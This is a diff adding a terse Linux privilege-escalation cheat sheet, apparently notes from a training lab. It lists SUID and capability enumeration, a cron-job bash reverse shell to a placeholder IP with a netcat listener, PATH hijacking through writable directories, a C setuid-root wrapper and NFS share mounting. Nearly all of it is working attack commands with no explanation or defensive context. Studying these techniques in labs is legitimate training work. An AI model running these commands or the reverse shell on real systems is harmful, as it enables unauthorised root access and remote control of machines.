@@ -1,0 +1,31 @@
+find / -type f -perm -04000 -ls 2>/dev/null
+
+Capabilities
+getcap -r / 2>/dev/null
+
+Crontab
+/etc/crontab
+bash -i >& /dev/tcp/x.x.x.x/1234 0>&1
+nc -lvnp 1234 (lisiner)
+
+
+PATH
+
+echo $PATH
+find / -writable 2>/dev/null” 
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+C code
+#include<unistd.h>
+void main()
+{ setuid(0);
+  setgid(0);
+  system("thm");
+}
+
+
+NFS
+cat /etc/exports
+showmount -e  x.x.x.x
+mount -o rw x.x.x.x:/sharefolder /moutfolder
+
